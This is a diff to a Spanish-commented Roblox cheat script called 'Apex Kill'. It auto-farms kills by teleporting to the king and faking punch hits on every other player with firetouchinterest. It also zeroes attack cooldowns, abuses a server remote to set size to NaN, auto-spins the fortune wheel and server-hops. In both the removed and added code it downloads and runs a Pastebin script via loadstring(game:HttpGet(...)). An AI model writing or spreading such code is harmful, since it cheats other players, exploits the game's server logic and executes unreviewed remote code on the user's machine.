@@ -1,4 +1,4 @@
---Variables Principales
+--Variables principales y servicios del juego
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local TS = game:GetService("TeleportService")
@@ -11,13 +11,31 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local VirtualUser = game:GetService("VirtualUser")
 local Settings = settings()
 
---Anti AFK
+--Evitar desconexion por inactividad
 LocalPlayer.Idled:Connect(function()
     VirtualUser:CaptureController()
     VirtualUser:ClickButton2(Vector2.new())
 end)
 
---Optimización de Rendimiento y Ocultación de Interfaz
+--Ocultar mascotas de otros jugadores en segundo plano
+task.spawn(function()
+    while task.wait(1) do
+        local currentPlayers = Players:GetPlayers()
+        for i = 1, #currentPlayers do
+            pcall(function()
+                local playerTarget = currentPlayers[i]
+                local hidePets = playerTarget:FindFirstChild("hidePets")
+                if hidePets and hidePets:IsA("BoolValue") then
+                    if hidePets.Value == false then
+                        hidePets.Value = true
+                    end
+                end
+            end)
+        end
+    end
+end)
+
+--Limpiar texturas y materiales para reducir lag
 local function cleanPart(v)
     if v:IsA("BasePart") or v:IsA("MeshPart") or v:IsA("UnionOperation") then
         v.Material = Enum.Material.Plastic
@@ -30,6 +48,7 @@ local function cleanPart(v)
     end
 end
 
+--Aplicar configuraciones graficas minimas
 local function optimizePerformance()
     Settings.Rendering.QualityLevel = Enum.QualityLevel.Level01
     Lighting.GlobalShadows = false
@@ -41,12 +60,16 @@ local function optimizePerformance()
     for _, v in pairs(Workspace:GetDescendants()) do cleanPart(v) end
 end
 optimizePerformance()
+
+--Conectar funcion de limpieza a nuevas partes generadas
 Workspace.DescendantAdded:Connect(cleanPart)
 
+--Comprobar y ocultar interfaces molestas del juego
 local playerGui = LocalPlayer:WaitForChild("PlayerGui")
 local function checkAndHideGui(gui)
     if gui:IsA("TextLabel") or gui:IsA("ImageLabel") or gui:IsA("Frame") then
         if gui.Name == "ApexKillGUI" or gui:IsDescendantOf(playerGui:FindFirstChild("ApexKillGUI")) then return end
+        
         local nameLower = gui.Name:lower()
         local textLower = gui:IsA("TextLabel") and gui.Text:lower() or ""
         
@@ -61,28 +84,44 @@ local function checkAndHideGui(gui)
     end
 end
 
+--Aplicar bloqueo de interfaces iniciales
 for _, g in pairs(playerGui:GetDescendants()) do checkAndHideGui(g) end
+
+--Aplicar bloqueo de interfaces a futuros elementos
 playerGui.DescendantAdded:Connect(checkAndHideGui)
 
---Interfaz de Usuario
+--Eliminar interfaz previa si ya existe
 if playerGui:FindFirstChild("ApexKillGUI") then
     playerGui["ApexKillGUI"]:Destroy()
 end
 
+--Crear base principal de la interfaz
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "ApexKillGUI"
 screenGui.ResetOnSpawn = false
 screenGui.AutoLocalize = false
 screenGui.Parent = playerGui
 
+--Crear marco oscuro de la interfaz
 local frame = Instance.new("Frame")
 frame.Size = UDim2.new(0, 180, 0, 100)
 frame.Position = UDim2.new(0, 25, 0, 35)
-frame.BackgroundColor3 = Color3.fromRGB(45, 15, 85)
-frame.BorderSizePixel = 3
-frame.BorderColor3 = Color3.fromRGB(140, 60, 230)
+frame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
+frame.BorderSizePixel = 0
 frame.Parent = screenGui
 
+--Aplicar aura arcoiris animada sin lag
+local rgbAura = Instance.new("UIStroke")
+rgbAura.Parent = frame
+rgbAura.Thickness = 4
+rgbAura.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+--Actualizar colores del aura arcoiris en tiempo real
+RunService.RenderStepped:Connect(function()
+    rgbAura.Color = Color3.fromHSV(tick() % 4 / 4, 1, 1)
+end)
+
+--Texto del titulo de la interfaz
 local title = Instance.new("TextLabel")
 title.Size = UDim2.new(0, 110, 0, 25)
 title.Position = UDim2.new(0, 10, 0, 8)
@@ -90,11 +129,12 @@ title.BackgroundTransparency = 1
 title.AutoLocalize = false
 title.Text = "Apex Kill"
 title.TextColor3 = Color3.fromRGB(255, 255, 255)
-title.TextSize = 18
+title.TextSize = 16
 title.Font = Enum.Font.GothamBold
 title.TextXAlignment = Enum.TextXAlignment.Left
 title.Parent = frame
 
+--Texto indicador de latencia y cuadros por segundo
 local statsLabel = Instance.new("TextLabel")
 statsLabel.Size = UDim2.new(0, 60, 0, 25)
 statsLabel.Position = UDim2.new(1, -65, 0, 8)
@@ -106,18 +146,20 @@ statsLabel.Font = Enum.Font.SourceSansBold
 statsLabel.TextXAlignment = Enum.TextXAlignment.Right
 statsLabel.Parent = frame
 
+--Subtitulo descriptivo para las kills
 local subtitle = Instance.new("TextLabel")
 subtitle.Size = UDim2.new(0, 100, 0, 15)
 subtitle.Position = UDim2.new(0, 10, 0, 38)
 subtitle.BackgroundTransparency = 1
 subtitle.AutoLocalize = false
 subtitle.Text = "Kills:"
-subtitle.TextColor3 = Color3.fromRGB(155, 125, 185)
+subtitle.TextColor3 = Color3.fromRGB(180, 180, 180)
 subtitle.TextSize = 13
 subtitle.Font = Enum.Font.Gotham
 subtitle.TextXAlignment = Enum.TextXAlignment.Left
 subtitle.Parent = frame
 
+--Texto del cronometro de tiempo en el servidor
 local ChronoLabel = Instance.new("TextLabel")
 ChronoLabel.Size = UDim2.new(0, 70, 0, 15)
 ChronoLabel.Position = UDim2.new(1, -75, 0, 38)
@@ -125,10 +167,11 @@ ChronoLabel.BackgroundTransparency = 1
 ChronoLabel.Text = "00:00.00"
 ChronoLabel.Font = Enum.Font.SourceSans
 ChronoLabel.TextSize = 12
-ChronoLabel.TextColor3 = Color3.fromRGB(185, 185, 185)
+ChronoLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 ChronoLabel.TextXAlignment = Enum.TextXAlignment.Right
 ChronoLabel.Parent = frame
 
+--Texto que muestra la cantidad exacta de kills
 local killsLabel = Instance.new("TextLabel")
 killsLabel.Size = UDim2.new(1, -20, 0, 30)
 killsLabel.Position = UDim2.new(0, 10, 0, 58)
@@ -141,11 +184,12 @@ killsLabel.TextXAlignment = Enum.TextXAlignment.Left
 killsLabel.Text = "0 (0K)"
 killsLabel.Parent = frame
 
---Estadísticas y Cronómetro
+--Formatear numeros agregando comas divisorias
 local function formatNumber(v)
     return tostring(v):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
 end
 
+--Obtener kills actuales y actualizar texto de la interfaz
 local function updateKills()
     local leaderstats = LocalPlayer:FindFirstChild("leaderstats")
     if leaderstats and leaderstats:FindFirstChild("Kills") then
@@ -156,6 +200,8 @@ local function updateKills()
     end
 end
 updateKills()
+
+--Monitorear cambios en las kills para reflejarlos al instante
 task.spawn(function()
     local leaderstats = LocalPlayer:WaitForChild("leaderstats", 10)
     if leaderstats and leaderstats:FindFirstChild("Kills") then
@@ -163,14 +209,17 @@ task.spawn(function()
     end
 end)
 
+--Variables para conteo de tiempo y rendimiento
 local cStart = os.clock()
 local lastUpdate = 0
 local frameCount = 0
 
+--Sumar fotogramas por cada ciclo de renderizado
 RunService.RenderStepped:Connect(function()
     frameCount = frameCount + 1
 end)
 
+--Actualizar reloj y estadisticas de conexion periodicamente
 RunService.Heartbeat:Connect(function()
     local currentTime = os.clock()
     local cElapsed = currentTime - cStart
@@ -185,16 +234,18 @@ RunService.Heartbeat:Connect(function()
     end
 end)
 
---Funciones del Personaje
+--Obtener personaje del jugador activo
 local function getCharacter() 
     return LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait() 
 end
 
+--Obtener parte central del personaje
 local function getRoot() 
     local char = getCharacter()
     return char:WaitForChild("HumanoidRootPart", 5) 
 end
 
+--Aumentar tamaño de ataque modificando escala del humanoide
 local function applySize2()
     local character = LocalPlayer.Character
     local humanoid = character and character:FindFirstChildOfClass("Humanoid")
@@ -207,10 +258,13 @@ local function applySize2()
     end
 end
 
+--Coordenadas donde se encuentra el enemigo Rey
+local targetCFrame = CFrame.new(-8750, 121, -5859)
+
+--Forzar teletransporte e inmovilizar personaje en posicion enemiga
 local function teleportToKing()
     local root = getRoot()
     if not root then return end
-    local targetCFrame = CFrame.new(-8750, 121, -5859)
     root.Velocity = Vector3.zero
     root.AssemblyLinearVelocity = Vector3.zero
     root.CFrame = targetCFrame
@@ -221,176 +275,7 @@ local function teleportToKing()
     bp.Parent = root
 end
 
---Sistema de Combate y Animaciones
-local blockedAnimations = {
-    ["rbxassetid://3638729053"] = true,
-    ["rbxassetid://3638767427"] = true,
-}
-
-local function stopAnimations(humanoid)
-    for _, track in pairs(humanoid:GetPlayingAnimationTracks()) do
-        if track.Animation then
-            local animId = track.Animation.AnimationId
-            local animName = track.Name:lower()
-            if blockedAnimations[animId] or animName:match("punch") or animName:match("attack") or animName:match("right") then
-                track:Stop()
-            end
-        end
-    end
-end
-
-local function setupAnimationBlocking()
-    local char = LocalPlayer.Character
-    if not char or not char:FindFirstChild("Humanoid") then return end
-    local humanoid = char:FindFirstChild("Humanoid")
-    stopAnimations(humanoid)
-    if _G.AnimBlockConnection then _G.AnimBlockConnection:Disconnect() end
-    _G.AnimBlockConnection = humanoid.AnimationPlayed:Connect(function(track)
-        if track.Animation then
-            local animId = track.Animation.AnimationId
-            local animName = track.Name:lower()
-            if blockedAnimations[animId] or animName:match("punch") or animName:match("attack") or animName:match("right") then
-                track:Stop()
-            end
-        end
-    end)
-end
-
-local function overrideToolActivation()
-    local function processTool(tool)
-        if tool and (tool.Name == "Punch" or tool.Name:match("Attack") or tool.Name:match("Right")) then
-            if not tool:GetAttribute("ActivatedOverride") then
-                tool:SetAttribute("ActivatedOverride", true)
-                local connection = tool.Activated:Connect(function()
-                    task.wait(0.05)
-                    local char = LocalPlayer.Character
-                    if char and char:FindFirstChild("Humanoid") then
-                        stopAnimations(char.Humanoid)
-                    end
-                end)
-                if not _G.ToolConnections then _G.ToolConnections = {} end
-                _G.ToolConnections[tool] = connection
-            end
-        end
-    end
-    for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do processTool(tool) end
-    local char = LocalPlayer.Character
-    if char then
-        for _, tool in pairs(char:GetChildren()) do
-            if tool:IsA("Tool") then processTool(tool) end
-        end
-    end
-    if _G.BackpackAddedConnection then _G.BackpackAddedConnection:Disconnect() end
-    _G.BackpackAddedConnection = LocalPlayer.Backpack.ChildAdded:Connect(function(child)
-        if child:IsA("Tool") then task.wait(0.1) processTool(child) end
-    end)
-end
-
-local function initCharacter()
-    task.wait(0.2)
-    teleportToKing()
-    setupAnimationBlocking()
-    overrideToolActivation()
-end
-
-task.spawn(initCharacter)
-LocalPlayer.CharacterAdded:Connect(function()
-    initCharacter()
-end)
-
-local tickCounter = 0
-RunService.Heartbeat:Connect(function()
-    tickCounter = tickCounter + 1
-    if tickCounter % 3 ~= 0 then return end 
-    applySize2()
-    local char = LocalPlayer.Character
-    if char and char:FindFirstChild("Humanoid") and char.Humanoid.Health > 0 then
-        stopAnimations(char.Humanoid)
-        local punchInBackpack = LocalPlayer.Backpack:FindFirstChild("Punch")
-        local punchInCharacter = char:FindFirstChild("Punch")
-        if punchInBackpack then
-            punchInBackpack.Parent = char
-            if punchInBackpack:FindFirstChild("attackTime") then punchInBackpack.attackTime.Value = 0 end
-        end
-        if punchInCharacter then
-            if punchInCharacter:FindFirstChild("attackTime") then punchInCharacter.attackTime.Value = 0 end
-            punchInCharacter:Activate()
-        end
-        local tool = char:FindFirstChildOfClass("Tool")
-        if tool and (tool.Name:lower():find("punch") or tool.Name:lower():find("attack")) then
-            pcall(function() tool:Activate() tool:Activate() end)
-        end
-        local rightHand = char:FindFirstChild("RightHand")
-        local leftHand = char:FindFirstChild("LeftHand")
-        if rightHand and leftHand then
-            for _, target in ipairs(Players:GetPlayers()) do
-                if target ~= LocalPlayer and target.Character then
-                    local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
-                    local targetHumanoid = target.Character:FindFirstChild("Humanoid")
-                    if targetRoot and targetHumanoid and targetHumanoid.Health > 0 then
-                        pcall(function()
-                            firetouchinterest(rightHand, targetRoot, 1)
-                            firetouchinterest(leftHand, targetRoot, 1)
-                            firetouchinterest(rightHand, targetRoot, 0)
-                            firetouchinterest(leftHand, targetRoot, 0)
-                        end)
-                    end
-                end
-            end
-        end
-    end
-end)
-
---Eventos Misceláneos
-local toggled = true
-UserInputService.InputBegan:Connect(function(input, gameProcessed)
-    if gameProcessed then return end
-    if input.KeyCode == Enum.KeyCode.F then
-        toggled = not toggled
-        if playerGui:FindFirstChild("Chat") then
-            playerGui.Chat.Frame.Visible = toggled
-        end
-    end
-end)
-
-pcall(function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/AxVHmk1i"))()
-end)
-
-_G.AutoSpinWheel = true
-task.spawn(function()
-    while _G.AutoSpinWheel do
-        local rEvents = ReplicatedStorage:FindFirstChild("rEvents")
-        local remote = rEvents and rEvents:FindFirstChild("openFortuneWheelRemote")
-        if remote and ReplicatedStorage:FindFirstChild("fortuneWheelChances") then
-            remote:InvokeServer("openFortuneWheel", ReplicatedStorage.fortuneWheelChances["Fortune Wheel"])
-        end
-        task.wait(1) 
-    end
-end)
-
-task.spawn(function()
-    while task.wait(0.5) do
-        pcall(function()
-            local rEvents = ReplicatedStorage:FindFirstChild("rEvents")
-            local remote = rEvents and rEvents:FindFirstChild("changeSpeedSizeRemote")
-            if remote then
-                remote:InvokeServer("changeSize", 0/0)
-            end
-        end)
-    end
-end)
-
-if typeof(Killer) ~= "nil" and Killer.AddButton then
-    Killer:AddButton("Size NaN", function()
-        local rEvents = ReplicatedStorage:FindFirstChild("rEvents")
-        if rEvents and rEvents:FindFirstChild("changeSpeedSizeRemote") then
-            rEvents.changeSpeedSizeRemote:InvokeServer("changeSize", 0/0)
-        end
-    end)
-end
-
---Server Hop
+--Buscar servidores con pocos jugadores y unirse automaticamente
 local function ExecuteRealServerHop()
     local nextCursor = ""
     local serverFound = false
@@ -424,6 +309,212 @@ local function ExecuteRealServerHop()
     if not serverFound then pcall(function() TS:Teleport(game.PlaceId, LocalPlayer) end) end
 end
 
+--Lista negra de animaciones para interrumpir combates
+local blockedAnimations = {
+    ["rbxassetid://3638729053"] = true,
+    ["rbxassetid://3638767427"] = true,
+}
+
+--Detener reproduccion de golpes y ataques actuales
+local function stopAnimations(humanoid)
+    for _, track in pairs(humanoid:GetPlayingAnimationTracks()) do
+        if track.Animation then
+            local animId = track.Animation.AnimationId
+            local animName = track.Name:lower()
+            if blockedAnimations[animId] or animName:match("punch") or animName:match("attack") or animName:match("right") then
+                track:Stop()
+            end
+        end
+    end
+end
+
+--Vigilar constantemente reproduccion de animaciones y bloquearlas
+local function setupAnimationBlocking()
+    local char = LocalPlayer.Character
+    if not char or not char:FindFirstChild("Humanoid") then return end
+    local humanoid = char:FindFirstChild("Humanoid")
+    stopAnimations(humanoid)
+    if _G.AnimBlockConnection then _G.AnimBlockConnection:Disconnect() end
+    _G.AnimBlockConnection = humanoid.AnimationPlayed:Connect(function(track)
+        if track.Animation then
+            local animId = track.Animation.AnimationId
+            local animName = track.Name:lower()
+            if blockedAnimations[animId] or animName:match("punch") or animName:match("attack") or animName:match("right") then
+                track:Stop()
+            end
+        end
+    end)
+end
+
+--Sobrescribir uso de guantes o puños para evitar ralentizaciones
+local function overrideToolActivation()
+    local function processTool(tool)
+        if tool and (tool.Name == "Punch" or tool.Name:match("Attack") or tool.Name:match("Right")) then
+            if not tool:GetAttribute("ActivatedOverride") then
+                tool:SetAttribute("ActivatedOverride", true)
+                local connection = tool.Activated:Connect(function()
+                    task.wait(0.05)
+                    local char = LocalPlayer.Character
+                    if char and char:FindFirstChild("Humanoid") then
+                        stopAnimations(char.Humanoid)
+                    end
+                end)
+                if not _G.ToolConnections then _G.ToolConnections = {} end
+                _G.ToolConnections[tool] = connection
+            end
+        end
+    end
+    for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do processTool(tool) end
+    local char = LocalPlayer.Character
+    if char then
+        for _, tool in pairs(char:GetChildren()) do
+            if tool:IsA("Tool") then processTool(tool) end
+        end
+    end
+    if _G.BackpackAddedConnection then _G.BackpackAddedConnection:Disconnect() end
+    _G.BackpackAddedConnection = LocalPlayer.Backpack.ChildAdded:Connect(function(child)
+        if child:IsA("Tool") then task.wait(0.1) processTool(child) end
+    end)
+end
+
+--Iniciar metodos de combate al momento de jugar
+local function initCharacter()
+    task.wait(0.2)
+    teleportToKing()
+    setupAnimationBlocking()
+    overrideToolActivation()
+    
+    local char = LocalPlayer.Character
+    if char then
+        local humanoid = char:FindFirstChild("Humanoid")
+        if humanoid then
+            humanoid.Died:Connect(function()
+                ExecuteRealServerHop()
+            end)
+        end
+    end
+end
+
+--Llamar inicializacion en primer arranque
+task.spawn(initCharacter)
+
+--Asegurar inicializacion en cada regeneracion de personaje
+LocalPlayer.CharacterAdded:Connect(function()
+    initCharacter()
+end)
+
+--Fingir impacto del puño contra el enemigo sin acumular memoria
+local function safeTouch(hand, root)
+    firetouchinterest(hand, root, 1)
+    firetouchinterest(hand, root, 0)
+end
+
+--Variable de contador para moderar los calculos
+local tickCounter = 0
+
+--Iniciar bucle constante de ataque y farmeo
+RunService.Heartbeat:Connect(function()
+    tickCounter = tickCounter + 1
+    
+    local char = LocalPlayer.Character
+    if not char or not char:FindFirstChild("Humanoid") or char.Humanoid.Health <= 0 then return end
+    
+    if tickCounter % 30 == 0 then
+        applySize2()
+    end
+    
+    if tickCounter % 5 == 0 then
+        stopAnimations(char.Humanoid)
+        local punchInBackpack = LocalPlayer.Backpack:FindFirstChild("Punch")
+        local punchInCharacter = char:FindFirstChild("Punch")
+        
+        if punchInBackpack then
+            punchInBackpack.Parent = char
+            if punchInBackpack:FindFirstChild("attackTime") then punchInBackpack.attackTime.Value = 0 end
+        end
+        if punchInCharacter then
+            if punchInCharacter:FindFirstChild("attackTime") then punchInCharacter.attackTime.Value = 0 end
+            punchInCharacter:Activate()
+        end
+        
+        local tool = char:FindFirstChildOfClass("Tool")
+        if tool and (tool.Name:lower():find("punch") or tool.Name:lower():find("attack")) then
+            pcall(tool.Activate, tool)
+        end
+        
+        local rightHand = char:FindFirstChild("RightHand")
+        local leftHand = char:FindFirstChild("LeftHand")
+        if rightHand or leftHand then
+            local playersList = Players:GetPlayers()
+            for i = 1, #playersList do
+                local target = playersList[i]
+                if target ~= LocalPlayer and target.Character then
+                    local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
+                    local targetHumanoid = target.Character:FindFirstChild("Humanoid")
+                    if targetRoot and targetHumanoid and targetHumanoid.Health > 0 then
+                        if rightHand then pcall(safeTouch, rightHand, targetRoot) end
+                        if leftHand then pcall(safeTouch, leftHand, targetRoot) end
+                    end
+                end
+            end
+        end
+    end
+end)
+
+--Ocultar o mostrar chat apretando la tecla F
+local toggled = true
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+    if input.KeyCode == Enum.KeyCode.F then
+        toggled = not toggled
+        if playerGui:FindFirstChild("Chat") then
+            playerGui.Chat.Frame.Visible = toggled
+        end
+    end
+end)
+
+--Cargar script complementario externo
+pcall(function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/AxVHmk1i"))()
+end)
+
+--Reclamar ruleta de la suerte automaticamente cada segundo
+_G.AutoSpinWheel = true
+task.spawn(function()
+    while _G.AutoSpinWheel do
+        local rEvents = ReplicatedStorage:FindFirstChild("rEvents")
+        local remote = rEvents and rEvents:FindFirstChild("openFortuneWheelRemote")
+        if remote and ReplicatedStorage:FindFirstChild("fortuneWheelChances") then
+            remote:InvokeServer("openFortuneWheel", ReplicatedStorage.fortuneWheelChances["Fortune Wheel"])
+        end
+        task.wait(1) 
+    end
+end)
+
+--Mantener tamaño de daño bugueado repetidamente
+task.spawn(function()
+    while task.wait(0.5) do
+        pcall(function()
+            local rEvents = ReplicatedStorage:FindFirstChild("rEvents")
+            local remote = rEvents and rEvents:FindFirstChild("changeSpeedSizeRemote")
+            if remote then
+                remote:InvokeServer("changeSize", 0/0)
+            end
+        end)
+    end
+end)
+
+--Crear acceso directo en interfaz extra de exploit
+if typeof(Killer) ~= "nil" and Killer.AddButton then
+    Killer:AddButton("Size NaN", function()
+        local rEvents = ReplicatedStorage:FindFirstChild("rEvents")
+        if rEvents and rEvents:FindFirstChild("changeSpeedSizeRemote") then
+            rEvents.changeSpeedSizeRemote:InvokeServer("changeSize", 0/0)
+        end
+    end)
+end
+
+--Forzar cambio de servidor después de 45 segundos
 task.spawn(function()
     task.wait(45)
     ExecuteRealServerHop()
